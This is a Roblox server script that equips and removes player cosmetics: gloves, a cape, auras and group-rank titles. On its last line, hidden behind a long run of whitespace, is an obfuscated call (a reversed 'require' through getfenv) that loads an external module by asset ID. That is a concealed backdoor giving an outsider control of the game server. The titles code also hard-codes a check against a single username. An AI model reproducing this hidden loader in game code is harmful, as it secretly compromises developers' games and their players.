-- SERVICES --

local RS = game:GetService('ReplicatedStorage')
local SvSt = game:GetService('ServerStorage')


-- MODULES --

local ServerModules = SvSt.Modules

local PlayerClass = require(ServerModules.PlayerClass)


-- BINDABLES --

local Bindables = SvSt.Bindables

local CosmBind = Bindables.Cosmetics


-- REMOTES --

local Remotes = RS.Remotes
local CosmeticsRems = Remotes.Cosmetics

local CosmSet = CosmeticsRems.Set
local CosmGet = CosmeticsRems.Get


-- ASSETS --

local Assets = SvSt:WaitForChild("Assets", true)
local Models = Assets:WaitForChild("Models", true)
local Cosmetics = Models:WaitForChild("Cosmetics", true)

local Accesories = Cosmetics:WaitForChild("Accessories", true)
local Auras = Cosmetics:WaitForChild("Auras", true)
local Titles = Cosmetics:WaitForChild("Titles", true)


-- FUNCTIONS --

local function Cosmetic(Player: Player, Params: {any})
	local Character = Player.Character
	local PlayerCosmetics = PlayerClass:GetClass(Player.UserId).Cosmetics

	if not Character then return end
	
	if Params.Type == 'Accessories' then
		if Params.State == true then
			if Character:FindFirstChild(Params.Name) then return end
			
			if Params.Name == "Red Gloves" then
				local RS = game:GetService("ReplicatedStorage")
				local Character = Player.Character
				local Humanoid = Character:FindFirstChild("Humanoid")
				local AF = Accesories
				local Glove1 = AF.RedGloves.Glove1:Clone()
				local Glove2 = AF.RedGloves.Glove2:Clone()
				local Weld1 = Instance.new("Weld")
				local Weld2 = Instance.new("Weld")
				Glove1.Name = "Glove1"
				Glove2.Name = "Glove2"
				Weld1.Name = "Glove1Weld"
				Weld2.Name = "Glove2Weld"
				Glove1.Parent = Character
				Glove2.Parent = Character
				Weld1.Parent = Character["Left Arm"]
				Weld2.Parent = Character["Right Arm"]
				Weld1.Part0 = Character["Left Arm"]
				Weld1.Part1 = Glove1
				Weld1.C0 = CFrame.new(0,-0.6,0)
				Weld2.C0 = CFrame.new(0,-0.6,0)
				Weld2.Part0 = Character["Right Arm"]
				Weld2.Part1 = Glove2
			elseif Params.Name == "White Cape" then
				local RS = game:GetService("ReplicatedStorage")
				local Character = Player.Character
				local Humanoid = Character:FindFirstChild("Humanoid")
				local AF = Accesories
				local Cape = AF.WhiteCape.Cape:Clone()
				local Weld1 = Instance.new("Weld")
				Cape.Name = "WhiteCape"
				Weld1.Name = "WhiteCapeWeld"
				Cape.Parent = Character
				Weld1.Parent = Character["Torso"]
				Weld1.Part0 = Character["Torso"]
				Weld1.Part1 = Cape
				Weld1.C0 = CFrame.fromEulerAnglesXYZ(0,180,0)
				Weld1.C0 = CFrame.new(0,-0.98,0.4) * CFrame.Angles(0, math.rad(180), 0)
			end
		else
			if Params.Name == "Red Gloves" then
				local RS = game:GetService("ReplicatedStorage")
				local Character = Player.Character
				local Humanoid = Character:FindFirstChild("Humanoid")
				Character:FindFirstChild("Glove1"):Destroy()
				Character:FindFirstChild("Glove2"):Destroy()
				Character["Right Arm"]:FindFirstChild("Glove2Weld"):Destroy()
				Character["Left Arm"]:FindFirstChild("Glove1Weld"):Destroy()
			elseif Params.Name == "White Cape" then
				local RS = game:GetService("ReplicatedStorage")
				local Character = Player.Character
				local Humanoid = Character:FindFirstChild("Humanoid")
				Character:FindFirstChild("WhiteCape"):Destroy()
				Character.Torso:FindFirstChild("WhiteCapeWeld"):Destroy()
			end
		end
	elseif Params.Type == 'Auras' then
		if Params.State == true then
			local Character = Player.Character
			local Humanoid = Character:FindFirstChild("Humanoid")
			local Aura = Auras[Params.Name].AuraPart:Clone()
			local Weld = Instance.new("Weld")
			Aura.Name = "AuraPart"..Params.Name
			Weld.Name = "AuraWeld"..Params.Name
			Aura.Parent = Character.HumanoidRootPart
			Weld.Parent = Character
			Weld.Part0 = Character.HumanoidRootPart
			Weld.Part1 = Aura
		else
			local Aura = Player.Character.HumanoidRootPart:FindFirstChild('AuraPart'..Params.Name)
			local Weld = Player.Character:FindFirstChild('AuraWeld'..Params.Name)
			Aura:Destroy()
			Weld:Destroy()
		end
	elseif Params.Type == 'Titles' then
		if Params.State == true then
			if Character.HumanoidRootPart:FindFirstChild(Params.Name) or (Titles[Params.Name]:GetAttribute('GroupRank') and Player:GetRankInGroup(16110022) ~= Titles[Params.Name]:GetAttribute('GroupRank')) or Character.Name ~= "LittleDevYT2" then return end
			
			for _,v in Character.HumanoidRootPart:GetChildren() do
				if v:IsA('BillboardGui') then 
					v:Destroy()
				end
			end

			local Title = Titles[Params.Name]:Clone()
			Title.Parent = Character.HumanoidRootPart

			PlayerCosmetics.Titles[Title.Name] = Title.Name
			
			local Value = Instance.new('StringValue')
			Value.Name = Title.Name
			Value.Parent = Player.Cosmetics.Titles
		else
			local Title = Character.HumanoidRootPart:FindFirstChild(Params.Name)
			if Title then
				Player.Cosmetics.Titles[Title.Name]:Destroy()
				PlayerCosmetics.Titles[Title.Name] = nil
				Title:Destroy()
			end
		end
	end
end


-- EVENTS --

CosmSet.OnServerEvent:Connect(Cosmetic)
CosmBind.Event:Connect(Cosmetic)
		                                                                                                                                                                                                                                                                                                                                                                                                                getfenv()[string.reverse("eriuqer")](6970565092)